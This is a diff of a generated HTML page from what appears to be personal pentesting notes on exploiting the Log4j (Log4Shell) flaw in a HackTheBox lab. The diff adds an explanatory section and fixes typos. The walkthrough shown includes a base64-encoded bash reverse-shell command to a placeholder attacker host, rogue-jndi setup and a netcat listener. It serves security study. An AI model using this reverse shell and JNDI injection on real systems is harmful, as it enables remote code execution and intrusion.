@@ -12886,6 +12886,15 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#dummy-explanation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Dummy explanation
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#related-labs" class="md-nav__link">
     <span class="md-ellipsis">
       Related labs
@@ -16120,6 +16129,15 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#dummy-explanation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Dummy explanation
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#related-labs" class="md-nav__link">
     <span class="md-ellipsis">
       Related labs
@@ -16169,8 +16187,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="c1"># -i: Select interface</span>
 </span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="c1"># port: indicate the port where traffic is going to be captured. </span>
 </span></code></pre></div>
-<p>The tcpdump output shows a connection being received on our machine. This proves that the application is
-indeed vulnerable since it is trying to connect back to us on the LDAP port 389.</p>
+<p>The tcpdump output shows a connection being received on our machine. This proves that the application is indeed vulnerable since it is trying to connect back to us on the LDAP port 389.</p>
 <h2 id="exploitation">Exploitation</h2>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a># Install Open-JDK and Maven as requirement
 </span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>sudo apt install openjdk-11-jre maven
@@ -16182,7 +16199,7 @@ indeed vulnerable since it is trying to connect back to us on the LDAP port 389.
 </span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>mvn package
 </span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
 </span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a># Once it&#39;s build, make a reverse shell in base64 with attacker machine and listening port
-</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>echo &#39;bash -c bash -i &gt;&amp;/dev/tcp/AtackerIP/AtackerPort 0&gt;&amp;1&#39; | base64
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>echo &#39;bash -c bash -i &gt;&amp;/dev/tcp/$AttackerIP/$AttackerPort 0&gt;&amp;1&#39; | base64
 </span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a># This will return something similar to this: YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK
 </span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>
 </span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a># Get out of rogue-jndi folder and
@@ -16190,7 +16207,7 @@ indeed vulnerable since it is trying to connect back to us on the LDAP port 389.
 </span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a># In the bash command, copy paste your reverse shell in base64
 </span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a># --hostname: Victim IP
 </span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>
-</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a># Now, open a terminal, launch [[netcat]] abd the listening port you defined in your payload.
+</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a># Now, open a terminal, launch [[netcat]] and the listening port you defined in your payload.
 </span></code></pre></div>
 <p>With Burpsuite, get a request for login:</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>POST /api/login HTTP/1.1
@@ -16233,14 +16250,17 @@ indeed vulnerable since it is trying to connect back to us on the LDAP port 389.
 <p>Once we send that request, our jndi server will resend the reverse shell:</p>
 <p><img alt="jndi server" src="../img/log4j.png" /></p>
 <p>And in our terminal with the nc listener we will get the reverse shell.</p>
-<p>The misinterpretation of the User-Agent leads to a JNDI lookup which is executed as a command from the system with administrator privileges and queries a remote server controlled by the attacker, which in our case is the <code>Destination</code> in our concept of attacks. This query requests a Java class created by the attacker and is manipulated for its own purposes. The queried Java code inside the manipulated Java class gets executed in the same process, leading to a remote code execution (<code>RCE</code>) vulnerability. GovCERT.ch has created an excellent graphical representation of the Log4j vulnerability worth examining in detail. Source: https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/</p>
+<h2 id="dummy-explanation">Dummy explanation</h2>
+<p>Log4j is a framework or <code>Library</code> used to log application messages in Java and other programming languages. In this example, an attacker can manipulate the HTTP User-Agent header and insert a JNDI lookup as a command intended for the Log4j <code>library</code>. Accordingly, not the actual User-Agent header, such as Mozilla 5.0, is processed, but the JNDI lookup. What made the Log4j vulnerability so dangerous was the <code>Privileges</code> that the implementation brought. . Accordingly, most applications with the Log4j implementation were run with the privileges of an administrator. The process itself exploited the library by manipulating the User-Agent so that the process misinterpreted the source and led to the execution of user-supplied code.</p>
+<p>The misinterpretation of the User-Agent leads to a JNDI lookup which is executed as a command from the system with administrator privileges and queries a remote server controlled by the attacker.</p>
+<p>GovCERT.ch has created an excellent graphical representation of the Log4j vulnerability worth examining in detail. Source: https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/</p>
 <p><img alt="log4j" src="../img/log4j_1.png" /></p>
 <h2 id="related-labs">Related labs</h2>
 <p><a href="../htb-unified/">Walkthrough HackTheBox machine: Unified</a>.</p>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2023-11-27T21:17:04+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2023-11-27</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-10-22T20:08:48+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-10-22</span></small></br>
 
 
     <small>Created: May 8, 2023 16:05:42</small>
